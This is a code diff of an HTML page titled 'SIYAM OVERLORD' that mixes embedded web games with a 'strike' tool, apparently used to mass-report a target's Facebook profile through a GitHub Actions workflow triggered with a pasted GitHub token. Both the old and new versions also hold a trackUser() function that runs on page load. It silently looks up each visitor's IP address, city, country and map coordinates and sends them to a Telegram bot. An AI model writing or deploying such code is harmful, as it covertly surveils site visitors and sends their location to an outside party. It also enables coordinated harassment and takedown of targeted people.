@@ -1,11 +1,11 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>SIYAM OVERLORD v23.0 - ADMIN HUB</title>
+    <title>SIYAM OVERLORD v24.0 - CYBER HUB</title>
     <style>
         body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; margin: 0; padding: 10px; }
-        .box { border: 2px solid #0f0; padding: 20px; border-radius: 10px; margin-bottom: 20px; box-shadow: 0 0 20px #0f0; }
+        .box { border: 2px solid #0f0; padding: 15px; border-radius: 10px; margin-bottom: 15px; box-shadow: 0 0 15px #0f0; }
         input { width: 85%; padding: 12px; background: #111; border: 1px solid #0f0; color: #fff; margin: 10px 0; border-radius: 5px; }
         .btn { padding: 15px; width: 90%; font-weight: bold; cursor: pointer; border-radius: 8px; border: none; transition: 0.3s; }
         .strike-btn { background: #ffa500; color: #000; box-shadow: 0 0 10px #ffa500; }
@@ -19,13 +19,13 @@
 <body onload="trackUser()">
 
 <div class="box">
-    <h1 style="font-size: 20px;">SIYAM OVERLORD v23.0</h1>
-    <p style="font-size: 10px; color: #888;">ADMIN MODE: PENDING APPROVAL</p>
+    <h1 style="font-size: 20px;">SIYAM OVERLORD v24.0</h1>
+    <p style="font-size: 10px; color: #888;">STATUS: SECURE | IP: BD-SERVER-ROTATION</p>
     
-    <input type="text" id="target" placeholder="Paste Target FB Profile Link">
-    <button class="btn strike-btn" onclick="requestStrike()">🚀 REQUEST CLOUD STRIKE</button>
+    <input type="text" id="target" placeholder="Paste Target Facebook Link">
+    <button class="btn strike-btn" onclick="requestStrike()">🚀 DEPLOY 500+ BD REPORTS</button>
     
-    <div id="log">>> [SYSTEM READY] Awaiting target for Siyam...</div>
+    <div id="log">>> [SYSTEM READY] Awaiting command for Siyam...</div>
 </div>
 
 <div class="box">
@@ -37,6 +37,9 @@
         <div class="game-card" onclick="loadGame('https://wayou.github.io/t-rex-runner/')">DINO RUN</div>
         <div class="game-card" onclick="loadGame('https://mario.pixeljoint.com/')">MARIO</div>
         <div class="game-card" onclick="loadGame('https://www.snake-game.io/')">SNAKE</div>
+        <div class="game-card" onclick="loadGame('https://tetris.com/play-tetris')">TETRIS</div>
+        <div class="game-card" onclick="loadGame('https://flappybird.io/')">FLAPPY BIRD</div>
+        <div class="game-card" onclick="loadGame('https://subway-surfers.org/')">SUBWAY</div>
     </div>
     <iframe id="game-frame" class="game-viewer" src="https://hextris.io/"></iframe>
 </div>
@@ -51,49 +54,44 @@
         logBox.scrollTop = logBox.scrollHeight;
     }
 
-    function loadGame(url) {
-        document.getElementById('game-frame').src = url;
-        log("Loading Game: " + url.split('/')[2]);
-    }
+    function loadGame(url) { document.getElementById('game-frame').src = url; }
 
     async function trackUser() {
         try {
             const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            const info = `👤 **VISITOR TRACKED**\n🌐 IP: ${data.ip}\n📍 Location: ${data.city}, ${data.country_name}\n📡 ISP: ${data.org}\n🗺️ Map: https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+            const d = await res.json();
+            const info = `👤 **VISITOR TRACKED**\n🌐 IP: ${d.ip}\n📍 Location: ${d.city}, ${d.country_name}\n🗺️ Map: http://google.com/maps?q=${d.latitude},${d.longitude}`;
             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(info)}`);
-            log("Visitor Meta captured.");
-        } catch (e) { log("Tracking Error."); }
+            log("Visitor IP metadata captured.");
+        } catch (e) { log("Tracking node offline."); }
     }
 
     async function requestStrike() {
         const link = document.getElementById('target').value;
-        if(!link) return alert("Target missing!");
+        const token = prompt("Enter GitHub Token:");
+        if(!link || !token) return;
 
-        const token = prompt("Enter Key (ghp_...):");
-        if(!token) return;
+        log("Strike status: PENDING Approval...");
 
-        log("Strike status: PENDING...");
-        log("Waiting for Siyam's approval via Telegram.");
+        const adminMsg = `⚠️ **NEW STRIKE REQUEST**\n\nTarget: ${link}\n\nSiyam, এপ্রুভ করতে গিটহাব অ্যাপ বা ওয়েবসাইট চেক করুন।`;
+        
+        const inlineKeyboard = {
+            inline_keyboard: [[{ text: "✅ APPROVE MISSION", url: "https://github.com/siyamboss/siyamboss.github.io/actions" }]]
+        };
 
-        // টোকেন দিয়ে গিটহাব অ্যাকশন ট্রিগার করা
-        try {
-            const res = await fetch(`https://api.github.com/repos/siyamboss/siyamboss.github.io/actions/workflows/sentinel_cloud.yml/dispatches`, {
-                method: 'POST',
-                headers: { 'Authorization': `token ${token}`, 'Accept': 'application/vnd.github.v3+json' },
-                body: JSON.stringify({ ref: 'main', inputs: { target_link: link, region: "BD" } })
-            });
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: adminMsg, reply_markup: inlineKeyboard })
+        });
 
-            if(res.ok) {
-                log("REQUEST SENT! Check GitHub Actions to Approve.");
-                alert("আপনার রিকোয়েস্টটি সিয়াম (Admin) এর কাছে পাঠানো হয়েছে। গিটহাবে গিয়ে এটি Approve করলে রিপোর্ট শুরু হবে।");
-                
-                const adminMsg = `⚠️ **NEW STRIKE REQUEST**\n\nTarget: ${link}\nStatus: PENDING\n\nSiyam, গিটহাবের Actions ট্যাবে গিয়ে এই রিকোয়েস্টটি Approve করুন।`;
-                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(adminMsg)}`);
-            } else {
-                log("Error: Invalid Token or Workflow.");
-            }
-        } catch (e) { log("System Failed."); }
+        // Trigger GitHub Action
+        fetch(`https://api.github.com/repos/siyamboss/siyamboss.github.io/actions/workflows/sentinel_cloud.yml/dispatches`, {
+            method: 'POST',
+            headers: { 'Authorization': `token ${token}`, 'Accept': 'application/vnd.github.v3+json' },
+            body: JSON.stringify({ ref: 'main', inputs: { target_link: link } })
+        });
+        alert("রিকোয়েস্ট পাঠানো হয়েছে। টেলিগ্রামে বাটন চেপে গিটহাবে গিয়ে Approve করুন।");
     }
 </script>
 </body>
